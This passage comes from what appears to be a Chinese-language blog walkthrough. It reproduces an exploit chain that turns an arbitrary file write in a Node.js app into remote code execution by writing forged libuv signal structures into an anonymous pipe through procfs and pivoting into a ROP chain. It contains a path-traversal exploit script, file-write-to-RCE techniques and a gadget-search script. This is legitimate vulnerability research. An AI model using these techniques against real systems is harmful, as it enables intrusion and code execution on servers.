class="line">Attached; pid = <span class="number">17</span></span><br><span class="line">Listening on port <span class="number">1234</span></span><br><span class="line">Remote debugging <span class="keyword">from</span> host <span class="number">172.17</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>

<p><code>Ubuntu</code>系统</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@key:/home/key/Desktop/nodejs/<span class="number">123</span><span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED              STATUS              PORTS                                                                                  NAMES</span><br><span class="line">196d69441a97   my-node   <span class="string">&quot;docker-entrypoint.s…&quot;</span>   About a minute ago   Up About a minute   <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1234</span>-&gt;<span class="number">1234</span>/tcp, :::<span class="number">1234</span>-&gt;<span class="number">1234</span>/tcp, <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">3000</span>-&gt;<span class="number">3000</span>/tcp, :::<span class="number">3000</span>-&gt;<span class="number">3000</span>/tcp   wizardly_allen</span><br><span class="line">root@key:/home/key/Desktop/nodejs/<span class="number">123</span><span class="comment"># docker inspect -f &#x27;&#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&#x27; 196d69441a97</span></span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">root@key:/home/key/Desktop/nodejs/<span class="number">123</span><span class="comment"># gdb-multiarch</span></span><br><span class="line">GNU gdb (Ubuntu <span class="number">9.2</span>-0ubuntu1~<span class="number">20.04</span><span class="number">.2</span>) <span class="number">9.2</span></span><br><span class="line">Copyright (C) <span class="number">2020</span> Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version <span class="number">3</span> <span class="keyword">or</span> later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This <span class="keyword">is</span> free software: you are free to change <span class="keyword">and</span> redistribute it.</span><br><span class="line">There <span class="keyword">is</span> NO WARRANTY, to the extent permitted by law.</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;show copying&quot;</span> <span class="keyword">and</span> <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured <span class="keyword">as</span> <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual <span class="keyword">and</span> other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>.</span><br><span class="line">pwndbg: loaded <span class="number">148</span> pwndbg commands <span class="keyword">and</span> <span class="number">46</span> shell commands. <span class="type">Type</span> pwndbg [--shell | --<span class="built_in">all</span>] [<span class="built_in">filter</span>] <span class="keyword">for</span> a <span class="built_in">list</span>.</span><br><span class="line">pwndbg: created $rebase, $ida GDB functions (can be used <span class="keyword">with</span> <span class="built_in">print</span>/<span class="keyword">break</span>)</span><br><span class="line">------- tip of the day (disable <span class="keyword">with</span> <span class="built_in">set</span> show-tips off) -------</span><br><span class="line">Pwndbg mirrors some of Windbg commands like eq, ew, ed, eb, es, dq, dw, dd, db, ds <span class="keyword">for</span> writing <span class="keyword">and</span> reading memory</span><br><span class="line">pwndbg&gt; file node </span><br><span class="line">Reading symbols <span class="keyword">from</span> node...</span><br><span class="line">pwndbg&gt; target remote <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="任意文件写漏洞分析"><a href="#任意文件写漏洞分析" class="headerlink" title="任意文件写漏洞分析"></a>任意文件写漏洞分析</h3><p>在<code>app.js</code>文件中<code>filename</code>和<code>content</code>全是来自请求中的<code>body</code>内容，导致任意文件写漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/upload&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">  const &#123; filename, content &#125; = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!filename || !content) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.status(<span class="number">400</span>).json(&#123; message: <span class="string">&#x27;Filename and content are required!&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const filePath = path.join(__dirname, <span class="string">&#x27;uploads&#x27;</span>, filename);</span><br><span class="line"></span><br><span class="line">  fs.writeFile(filePath, content, (err) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.status(<span class="number">500</span>).json(&#123; message: <span class="string">&#x27;Error saving file!&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.json(&#123; message: <span class="string">&#x27;File uploaded successfully!&#x27;</span>, path: filePath &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标 URL</span></span><br><span class="line">url = <span class="string">&#x27;http://localhost:3000/upload&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造数据包</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;../zzz/test.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;content&quot;</span>: <span class="string">&quot;This is a test file content.&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 POST 请求</span></span><br><span class="line">response = requests.post(url, json=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印响应</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Status Code:&quot;</span>, response.status_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Response JSON:&quot;</span>, response.json())</span><br></pre></td></tr></table></figure>

<p>一般从任意文件写到命令执行思路</p>
<ul>
<li>将 PHP、JSP、ASPX 或类似文件写入 Web 根目录。</li>
<li>覆盖由服务器端模板引擎处理的模板文件。</li>
<li>写入配置文件（例如，uWSGI .ini 文件或 Jetty .xml 文件）。</li>
<li>添加一个 Python 站点特定的配置钩子。</li>
<li>通过写入 SSH 密钥、添加 cron 作业或覆盖用户的 .bashrc 文件来使用通用方法。</li>
</ul>
<h3 id="Read-only-file-system"><a href="#Read-only-file-system" class="headerlink" title="Read-only file system"></a>Read-only file system</h3><p>在一些<code>Linux</code>或类<code>Linux</code>系统中，可能是只读文件系统，只有<code>tmp</code>目录具有可写权限，此时任意文件写入漏洞是否可能转化为代码执行？（剧透一下是完全可以的）</p>
<p>在基于 <code>Unix</code> 的系统（如 <code>Linux</code>）上，一切都是文件。与传统的文件系统（如 <code>ext4</code>，它在物理硬盘上存储数据）不同，还有其他文件系统用于不同的目的。其中之一是 <code>procfs</code> 虚拟文件系统，通常挂载在 <code>/proc</code> 目录下，作为内核内部工作原理的窗口。<code>procfs</code> 不存储实际的文件，而是提供关于正在运行的进程、系统内存、硬件配置等实时信息的访问。</p>
<p><code>procfs </code>提供的一个特别有趣的信息是正在运行的进程的打开文件描述符，可以通过 <code>/proc//fd/</code> 来检查。进程打开的文件不仅可以是传统文件，还可以是设备文件、套接字和管道。例如，以下命令可以用来列出 <code>Node.js</code>进程的打开文件描述符：<code>/proc//fd/</code>。</p>
<p><img src="/images/MTc0MDMwMzUyMF9WNA.png" alt="img"></p>
<p>从上面的输出可以看到，这还包括匿名管道（例如，<code>pipe:[131298]</code>）。与在文件系统上以命名文件形式暴露的命名管道不同，由于缺乏引用，<em><strong>通常无法写入匿名管道。然而，</strong></em><em><strong><code>procfs</code></strong></em> <em><strong>文件系统允许</strong></em>我们通过其在 <code>/proc//fd/</code> 中的条目引用该管道。与 <code>procfs</code> 下的其他文件相比，这种文件写入不需要根权限，可以由运行 <code>Node.js</code> 应用程序的低权限用户执行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@host:~$ echo hello &gt; /proc/`pidof node`/fd/<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>即使 <code>procfs </code>被以只读方式挂载（例如在 <code>Docker </code>容器中），也可以写入管道，因为管道由一个名为 <code>pipefs</code> 的独立文件系统处理，该文件系统在内核内部使用。</p>
<p>这为攻击者揭示了新的攻击面：能够写入任意文件的攻击者可以向从匿名管道读取数据的事件处理程序提供数据。</p>
<h3 id="Node-js-and-Pipes"><a href="#Node-js-and-Pipes" class="headerlink" title="Node.js and Pipes"></a>Node.js and Pipes</h3><p><code>Node.js</code> 基于 <code>V8 JavaScript</code> 引擎构建，该引擎是单线程的。然而，<code>Node.js</code> 提供了异步且非阻塞的事件循环。为此，它使用了一个名为 <code>libuv</code> 的库。该库利用匿名管道来发信号并处理事件，正如我们在上面的输出中通过 <code>procfs</code> 所看到的那样。</p>
<p>当 <code>Node.js</code> 应用程序存在文件写入漏洞时，没有任何机制阻止攻击者向这些管道写入数据，因为运行应用程序的用户对这些管道具有写权限。那么，写入管道的数据会发生什么呢？</p>
<p>在审查相关的 <code>libuv</code> 源代码时，一个名为 <code>uv__signal_event</code> 的处理程序引起了我们的注意。它假定从管道中读取的数据为 <code>uv__signal_msg_t</code> 类型的消息。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">uv__signal_event</span><span class="params">(<span class="type">uv_loop_t</span>* loop,</span></span><br><span class="line"><span class="params">                             <span class="type">uv__io_t</span>* w,</span></span><br><span class="line"><span class="params">                             <span class="type">unsigned</span> <span class="type">int</span> events)</span> &#123;</span><br><span class="line">  <span class="type">uv__signal_msg_t</span>* msg;</span><br><span class="line">  <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    r = read(loop-&gt;signal_pipefd[<span class="number">0</span>], buf + bytes, <span class="keyword">sizeof</span>(buf) - bytes);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; end; i += <span class="keyword">sizeof</span>(<span class="type">uv__signal_msg_t</span>)) &#123;</span><br><span class="line">      msg = (<span class="type">uv__signal_msg_t</span>*) (buf + i);</span><br><span class="line">      handle = msg-&gt;handle;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (msg-&gt;signum == handle-&gt;signum) &#123;</span><br><span class="line">        assert(!(handle-&gt;flags &amp; UV_HANDLE_CLOSING));</span><br><span class="line">        handle-&gt;signal_cb(handle, handle-&gt;signum);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure>

<p>该数据结构仅包含两个成员：一个指针 <code>handle</code> 和一个名为 <code>signum</code> 的整数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">uv_signal_t</span>* handle;</span><br><span class="line">  <span class="type">int</span> signum;</span><br><span class="line">&#125; <span class="type">uv__signal_msg_t</span>;</span><br></pre></td></tr></table></figure>

<p>该指针的类型是数据结构 <code>uv_signal_t</code> 的类型定义，它包含一个特别有趣的成员 <code>signal_cb</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">uv_signal_s</span> <span class="title">uv_signal_t</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uv_signal_s</span> &#123;</span></span><br><span class="line">  UV_HANDLE_FIELDS</span><br><span class="line">  uv_signal_cb signal_cb;</span><br><span class="line">  <span class="type">int</span> signum;</span><br><span class="line">  UV_SIGNAL_PRIVATE_FIELDS</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*uv_signal_cb)</span><span class="params">(<span class="type">uv_signal_t</span>* handle, <span class="type">int</span> signum)</span>;</span><br></pre></td></tr></table></figure>

<p>该成员是一个函数指针，通常包含回调函数的地址。当两个数据结构中的 <code>signum</code> 值匹配时，该回调函数会在事件处理程序中被调用。</p>
<p>注：其中<code>msg</code>是<code>uv__signal_msg_t</code>结构体指针，<code>handle</code>是<code>uv_signal_s</code>指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [...]</span></span><br><span class="line">msg = (<span class="type">uv__signal_msg_t</span>*) (buf + i);</span><br><span class="line">handle = msg-&gt;handle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msg-&gt;signum == handle-&gt;signum) &#123;</span><br><span class="line">  assert(!(handle-&gt;flags &amp; UV_HANDLE_CLOSING));</span><br><span class="line">  handle-&gt;signal_cb(handle, handle-&gt;signum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下图展示了事件处理程序所期望的数据结构：</p>
<p><img src="/images/k5MjA6MTc0MDMwMzUyMF9WNA.png" alt="img"></p>
<p>该报告被关闭为信息性。这意味着我们在接下来的章节中描述的技术仍适用于最新版本的 <code>Node.js</code>，并且这种情况在不久的将来可能不会改变。</p>
<h3 id="构建结构体"><a href="#构建结构体" class="headerlink" title="构建结构体"></a><strong>构建结构体</strong></h3><p>攻击者利用文件写入漏洞来利用事件处理程序的一般策略可能如下：</p>
<ul>
<li>向管道写入一个虚假的数据结构 <code>uv_signal_s</code>，将函数指针 <code>signal_cb</code> 设置为希望调用的任意地址。</li>
<li>向管道写入另一个虚假的数据结构 <code>uv__signal_msg_t</code>，将 <code>handle</code> 设置为指向之前写入的数据结构的指针 <code>uv_signal_s</code>。</li>
<li>将两个数据结构体的<code>signum</code>设置为相同的值 。</li>
<li>实现任意代码执行。</li>
</ul>
<p>假设攻击者只能写入文件，所有这些都需要在一次写入中完成，而不能事先读取任何内存。</p>
<p>事件处理程序的缓冲区相当大，这使得攻击者可以轻松地将两个数据结构写入管道。然而，有一个障碍：<strong>数据结构的地址是未知的，因为所有写入管道的数据都存储在栈上。</strong></p>
<p><img src="/images/MTc0MDMwMzUyMF9WNA55.png" alt="img"></p>
<p>因此，攻击者将无法使指针<code>handle</code>引用虚假的数据结构<code>uv_signal_s</code>。这引出了一个问题：攻击者是否有任何数据可以引用？</p>
<p>栈、堆以及所有库的地址都是通过地址空间布局随机化（<code>ASLR</code>）进行随机化的。然而，<code>Node.js</code> 二进制文件本身的段则不是。令人惊讶的是，官方 <code>Linux </code>版 <code>Node.js </code>并未启用位置无关可执行文件（<code>PIE</code>）：</p>
<p><img src="/images/xXzE3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNA.png" alt="img"></p>
<p>显然，这种情况是出于性能考虑，因为 <code>PIE </code>的间接寻址会增加一些小的开销。对于攻击者来说，这意味着他们可以引用 <code>Node.js</code> 段中的数据，因为该地址是已知的：</p>
<p>注：此时只发送一个<code>uv__signal_msg_t</code>结构体，并将<code>handle</code> 设置指向<code>uv_signal_s</code>结构体，而<code>uv_signal_s</code>结构体是在<code>node</code>程序中找的，不是我们发送的数据</p>
<p><img src="/images/E3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNA.png" alt="img"></p>
<p>下一个问题是：攻击者如何能在 <code>Node.js</code> 段中存储虚假的<code>uv_signal_s</code>结构体？寻找让 <code>Node.js</code> 将攻击者控制的数据存储在静态位置（例如，从 <code>HTTP</code>请求中读取的数据）的方法是一种方法，但这似乎相当具有挑战性。</p>
<p>一种更简单的方法是直接利用<strong>已经存在</strong>的内容。通过检查 <code>Node.js</code> 的内存段，攻击者可能能够识别出适合用于虚假结构的数据。</p>
<p>攻击者理想的数据结构可能类似于以下内容：</p>
<p><img src="/images/A6MTc0MDMwMzUyMF9WNA.png" alt="img"></p>
<p>这个数据结构以一个命令字符串（<code>system</code>）开头，后面是一个地址，位于正确的偏移量，以与函数指针重叠。攻击者只需要使这个值与假数据结构匹配，从而调用回调函数，有效地执行命令 <code>system(&quot;touch /tmp/pwned&quot;)</code>。</p>
<p>这种方法要求在 <code>Node.js</code> 段中存在 <code>system</code> 的地址。全局偏移表（<code>GOT</code>）通常是一个候选项。然而，<code>Node.js</code> 并没有使用 <code>system</code> 函数，因此它的地址并不在 <code>GOT</code> 中。即使存在，生成的假数据结构的开头很可能是 <code>GOT</code> 中的另一个条目，而不是一个有用的命令字符串。因此，另一种方法似乎更可行：经典的 <code>ROP</code> 链。</p>
<h3 id="搜索gadget"><a href="#搜索gadget" class="headerlink" title="搜索gadget"></a>搜索gadget</h3><p>每个 <code>ROP</code> 链的开始是搜索有用的 <code>ROP</code> 小工具。一个搜索 <code>ROP</code> 小工具的工具通常会解析磁盘上的 <code>ELF</code> 文件，然后确定所有可执行部分。<code>.text</code> 段通常是最大的可执行部分，因为它存储了程序本身的指令。</p>
<p><img src="/images/UyMF9WNA.png" alt="img"></p>
<p>现在，该工具遍历此段中的字节并查找 <code>ret</code> 指令，例如，因为这是 <code>ROP</code> 小工具的合适最后一条指令。然后，工具从表示该指令的字节向后逐字节地查找，以确定所有可能有用的 <code>ROP</code> 小工具。</p>
<p><img src="/images/Tk5MjA6MTc0MDMwMzUyMF9WNA.png" alt="img"></p>
<p>然而，在这种情况下，这并不是攻击者所需要的。攻击者需要的是一个引用假数据结构的地址，而这个虚假的<code>uv_signal_s</code>结构体通过<code>signal_cb</code>函数指针引用一个 <code>ROP</code> 小工具。因此，这里有一个间接性：<code>ROP</code> 小工具（指令序列的地址）需要存储在被引用的数据本身中。</p>
<p><img src="/images/9mXzE3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNA.png" alt="img"></p>
<p>为了识别像这样的合适数据结构，攻击者需要通过 <code>Node.js</code> 映像进行搜索，类似于经典的 <code>ROP</code> 小工具查找工具。然而，区别在于攻击者不仅对可执行部分（如 <code>.text</code> 段）感兴趣。<strong>假数据结构所在的内存不必是可执行的</strong>。攻击者需要的是指向小工具的指针。因此，他们可以考虑所有至少<strong>可读的段</strong>。此外，这个搜索可以在<strong>内存中进行</strong>，而不仅仅是解析磁盘上的 <code>ELF</code> 文件。通过这种方式，攻击者还可以找到在运行时仅创建的数据结构，例如在 <code>.bss</code> 段中。这可能会导致误报或特定于环境的结构，但增加了他们获得有用发现的机会，这些发现可以手动验证。</p>
<p>这种针对假数据结构的内存搜索的基本实现实际上非常简单：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> addr, <span class="built_in">len</span> <span class="keyword">in</span> nodejs_segments:</span><br><span class="line">   <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span> - <span class="number">7</span>):</span><br><span class="line">       ptr = read_mem(addr + offset, <span class="number">8</span>)</span><br><span class="line">       <span class="keyword">if</span> is_mapped(ptr) <span class="keyword">and</span> is_executable(ptr):</span><br><span class="line">           instr = read_mem(ptr, n)</span><br><span class="line">           <span class="keyword">if</span> is_useful_gadet(instr):</span><br><span class="line">               <span class="built_in">print</span>(<span class="string">&#x27;gadget at %08x&#x27;</span> % addr + offset)</span><br><span class="line">               <span class="built_in">print</span>(<span class="string">&#x27;-&gt; &#x27;</span> + disassemble(instr))</span><br></pre></td></tr></table></figure>

<p>该 <code>Python </code>脚本遍历所有 <code>Node.js</code> 内存区域，每次解析 <code>8</code> 个字节作为一个指针，并尝试引用该指针。如果地址已映射并引用了可执行段中的内存，则它会判断存储在该地址的字节序列是否是有用的 <code>ROP</code> 小工具：</p>
<p><img src="/images/yMF9WNA.png" alt="img"></p>
<p>这是 <code>Python </code>脚本的实际效果：</p>
<p><img src="/images/data-struct-tool.gif" alt="img"></p>
<p>所有潜在有用的 <code>ROP </code>小工具都被输出，并且现在可以用作在调用回调函数时执行的第一个初始 <code>ROP </code>小工具。由于所有写入管道的数据都存储在栈上，因此找到一个合适的支点小工具用于第一个小工具就足够了。一旦攻击者将栈指针指向受控数据，就可以使用经典的 <code>ROP </code>链：</p>
<p><img src="/images/zZLVmN1SmFWbmZkXzE3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNA.png" alt="img"></p>
<p>使用此技术利用任意文件漏洞时，有一个注意事项。通常，写入文件的函数（在本例中为 <code>fs.writeFile</code>）仅限于有效的 <code>UTF-8</code> 数据。因此，写入管道的所有数据必须是有效的 <code>UTF-8</code>。</p>
<h3 id="克服-UTF-8-限制"><a href="#克服-UTF-8-限制" class="headerlink" title="克服 UTF-8 限制"></a>克服 UTF-8 限制</h3><p>由于 <code>Node.js</code> 二进制文件的巨大尺寸（最新 <code>x64</code> 构建约为 <code>110M</code>），寻找适用于经典 <code>ROP</code> 链的有用 <code>UTF-8</code> 兼容小工具并不困难。然而，这一限制进一步限制了现有数据中适合伪造数据结构的潜在选择。因此，需要在脚本中添加额外的检查，以验证伪造数据结构的基地址是否为有效的 <code>UTF-8</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> addr, <span class="built_in">len</span> <span class="keyword">in</span> nodejs_segments:</span><br><span class="line">   <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span> - <span class="number">7</span>):</span><br><span class="line">       <span class="keyword">if</span> <span class="keyword">not</span> is_valid_utf8(addr + offset - <span class="number">0x60</span>): <span class="keyword">continue</span></span><br><span class="line">       ptr = read_mem(addr + offset, <span class="number">8</span>)</span><br><span class="line">       <span class="comment"># [...]</span></span><br></pre></td></tr></table></figure>

<p>即使进行了此额外检查，该脚本仍会生成合适的假数据结构，这些结构引用了如下所示的可旋转小工具：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="number">0x4354ca1</span> -&gt; <span class="number">0x12d0000</span>: pop rsi; pop r15; pop rbp; ret  </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这是相关数据结构在内存中的样子：</p>
<p><img src="/images/E3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNAa.png" alt="img"></p>
<p>这个伪造<code>uv_signal_s</code>结构体的基地址<code>0x4354c41</code>是有效的 <code>UTF-8</code>，因此数据结构中的指针可以正确填充。然而，还有<code>signum</code>与 <code>UTF-8 </code>相关的问题。</p>
<p><img src="/images/E1abnpmXzE3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNA.png" alt="img"></p>
<p><code>signum </code>值的最后一个字节是 <code>0xf0</code>，这不是有效的 <code>UTF-8</code>。如果攻击者尝试通过文件写入漏洞写入这个字节，<strong>它将被替换为替换字符，从而导致值检查失败</strong>。如果我们在 <code>UTF-8</code> 可视化工具中输入，我们可以看到这个字节引入了一个 <code>4</code> 字节的 <code>UTF-8</code> 序列：<code>0xf0</code>。</p>
<p><img src="/images/bmpnXzE3NDAyOTk5MjA6MTc0MDMwMzUyMF9WNA.png" alt="img"></p>
<p>因此，<code>UTF-8</code> 解析器期望在这个字节之后有<code>3</code>个续字符字节。由于数据结构包含一个<code>8</code>字节的指针和一个<code>4</code>字节的整数，编译器会添加<code>4</code>个额外的填充字节，以将结构对齐到<code>16</code>字节。这些字节可以用来添加<code>3</code>个续字符字节，从而构造一个有效的<code>UTF-8</code>序列：<code>uv__signal_msg_t</code>。</p>
<p><img src="/images/floppy.gif" alt="img"></p>
<p>例如，上面的软盘是一个有效的<code>4</code>字节 <code>UTF-8</code> 序列，以 <code>0xf0</code> 开头。通过添加这些续字符字节，攻击者可以满足整个有效负载为有效 <code>UTF-8 </code>的要求，并使这两个值匹配：<code>signum</code>。</p>
<p><img src="/images/10_utf8_success.webp" alt="img"></p>
<p>随着最后一个障碍的消除，攻击者能够获得远程代码执行权限。</p>
<p>以下视频演示了针对脆弱示例应用程序的利用，该应用程序以低权限用户身份在具有<strong>只读根文件系统和只读</strong> **<code>procfs </code>**<strong>的系统</strong>上运行：</p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=8FFsORk8snE">Demonstration of File Write vulnerability on a test instance</a></p>
<h2 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h2><p>书接上回</p>
<p>当配置<code>gdb</code>调试环境后，首先先<code>dump</code>内存</p>
<p><img src="/images/image.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dump memory mem1 <span class="number">0x400000</span> <span class="number">0xe0a000</span></span><br><span class="line">dump memory mem2 <span class="number">0xe0a000</span> <span class="number">0xe0d000</span></span><br><span class="line">dump memory mem3 <span class="number">0xe0e000</span> <span class="number">0x3005000</span></span><br><span class="line">dump memory mem4 <span class="number">0x3200000</span> <span class="number">0x3201000</span></span><br><span class="line">dump memory mem5 <span class="number">0x3201000</span> <span class="number">0x64a3000</span></span><br><span class="line">dump memory mem6 <span class="number">0x64a3000</span> <span class="number">0x64a7000</span></span><br><span class="line">dump memory mem7 <span class="number">0x64a7000</span> <span class="number">0x64d1000</span></span><br></pre></td></tr></table></figure>

<p>利用<code>python</code>脚本寻找合适的<code>gadget</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 